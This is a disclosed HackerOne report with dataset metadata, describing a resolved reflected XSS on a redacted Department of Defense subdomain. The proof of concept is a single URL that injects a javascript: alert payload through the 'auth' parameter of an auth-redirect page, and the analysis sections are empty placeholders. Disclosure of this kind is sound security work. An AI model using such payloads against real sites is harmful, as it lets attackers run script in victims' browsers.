---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '758854'
original_report_id: '758854'
title: Reflected Xss
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: deptofdefense
created_at: '2019-12-15T11:55:35.616Z'
disclosed_at: '2020-09-21T14:52:09.328Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 28
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Reflected Xss

## Metadata

- HackerOne Report ID: 758854
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: deptofdefense
- Disclosed At: 2020-09-21T14:52:09.328Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

>>hello security team i found reflected XSS in this subdomain https://███

POC:-
1-go in subdomain
2-go here 
https://███████/en/embeddedAuthRedirect.html?auth=javascript:alert("xElkomy")
3-Done

Image:-
███████
#xElkomy

## Impact

reflected cross-site scripting (XSS) operation with JavaScript, which runs in the client context. i can put malicious code in URL

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
